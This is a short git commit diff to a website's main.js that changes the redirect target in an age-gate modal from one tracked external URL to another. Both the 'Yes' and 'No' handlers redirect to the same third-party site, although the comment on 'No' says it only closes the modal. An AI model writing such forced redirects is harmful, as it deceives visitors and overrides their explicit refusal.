1897da0f77560d58524028f635867fd172a4bc36
skpsharma14-ops <skpsharma14@gmail.com>
2026-04-18 02:21:28 +0530

    Update main.js

--- assets/js/main.js
+++ assets/js/main.js
@@ -57,11 +57,11 @@ if(form){
    function closeGate(){ bd.style.display='none'; bd.remove(); }  
   // ✅ Redirect when "Yes" is clicked
   bd.querySelector('#age-yes').addEventListener('click', function(){
-    window.location.href = "https://inf4hub.com/?utm_campaign=jjncvhYVHd&v1=[v1]&v2=[v2]&v3=[v3]"; // change to your target page
+    window.location.href = "https://w23hub.com/?utm_campaign=RdPi6v684H&v1=[v1]&v2=[v2]&v3=[v3]"; // change to your target page
   });
  
   // ✅ Just close modal when "No" is clicked
   bd.querySelector('#age-no').addEventListener('click', function(){
-    window.location.href = "https://inf4hub.com/?utm_campaign=jjncvhYVHd&v1=[v1]&v2=[v2]&v3=[v3]"; // change to your target page
+    window.location.href = "https://w23hub.com/?utm_campaign=RdPi6v684H&v1=[v1]&v2=[v2]&v3=[v3]"; // change to your target page
   });
 })();
